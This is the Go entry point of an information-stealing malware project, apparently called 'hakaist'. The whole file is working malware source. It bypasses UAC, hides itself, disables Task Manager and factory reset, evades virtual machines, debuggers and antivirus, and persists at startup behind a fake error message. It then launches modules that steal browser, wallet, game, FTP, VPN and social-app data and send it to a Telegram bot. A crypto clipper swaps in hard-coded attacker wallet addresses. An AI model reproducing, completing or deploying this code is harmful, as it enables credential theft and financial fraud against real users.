package main

import (
	"github.com/lukyydnv/hakaist/internal/antidebug"
	"github.com/lukyydnv/hakaist/internal/antivirus"
	AntiVMAnalysis "github.com/lukyydnv/hakaist/internal/antivm"
	FakeError "github.com/lukyydnv/hakaist/internal/fakerr"
	FactoryReset "github.com/lukyydnv/hakaist/internal/fr"
	HideConsole "github.com/lukyydnv/hakaist/internal/hc"
	TaskManager "github.com/lukyydnv/hakaist/internal/taskmanager"
	Uac "github.com/lukyydnv/hakaist/internal/uac"
	"github.com/lukyydnv/hakaist/pkg/utils/common"
	"github.com/lukyydnv/hakaist/pkg/utils/processkill"
	"github.com/lukyydnv/hakaist/pkg/utils/startup"

	"github.com/lukyydnv/hakaist/internal/core/browsers"
	"github.com/lukyydnv/hakaist/internal/core/clipper"
	"github.com/lukyydnv/hakaist/internal/core/commonfiles"
	wallets "github.com/lukyydnv/hakaist/internal/core/cryptowallets"
	"github.com/lukyydnv/hakaist/internal/core/ftps"
	"github.com/lukyydnv/hakaist/internal/core/games"
	Socials "github.com/lukyydnv/hakaist/internal/core/socials"
	"github.com/lukyydnv/hakaist/internal/core/system"
	"github.com/lukyydnv/hakaist/internal/core/vpn"
)

var botToken string
var chatId string

func main() {
	CONFIG := map[string]interface{}{
		"botToken": botToken,
		"chatId":   chatId,
		"cryptos": map[string]string{
			"BTC":  "bc1qr85hew3n2xcufmh59299mnpt46nzpnd746gksh",
			"BCH":  "",
			"ETH":  "0x5989a6be6de95ee566526750c4AC9C6Ea9CbEba3",
			"XMR":  "",
			"LTC":  "LNZdCeEmGSbnUeA9eyRHtkok45KHfZUnWq",
			"XCH":  "",
			"XLM":  "",
			"TRX":  "TXrZgcxmzwoAazhuvhX31iYFvHPo3mu2ew",
			"ADA":  "",
			"DASH": "XqxWKQviNx6ZPPKjp5Wu1zmhvBWGuNTSQF",
			"DOGE": "DEm6Fp8swrKsGipeok36SeUq98CB9bCo9J",
		},
	}

	if common.IsAlreadyRunning() {
		return
	}

	Uac.Run()
	processkill.Run()

	HideConsole.Hide()
	common.HideSelf()
	FactoryReset.Disable()
	TaskManager.Disable()

	if !common.IsInStartupPath() {
		go FakeError.Show()
		go startup.Run()
	}

	AntiVMAnalysis.Check()
	go antidebug.Run()
	go antivirus.Run()

	actions := []func(string, string){
		system.Run,
		browsers.Run,
		commonfiles.Run,
		wallets.Run,
		games.Run,
		ftps.Run,
		vpn.Run,
		Socials.Run,
	}

	for _, action := range actions {
		go action(CONFIG["botToken"].(string), CONFIG["chatId"].(string))
	}

	clipper.Run(CONFIG["cryptos"].(map[string]string))
}
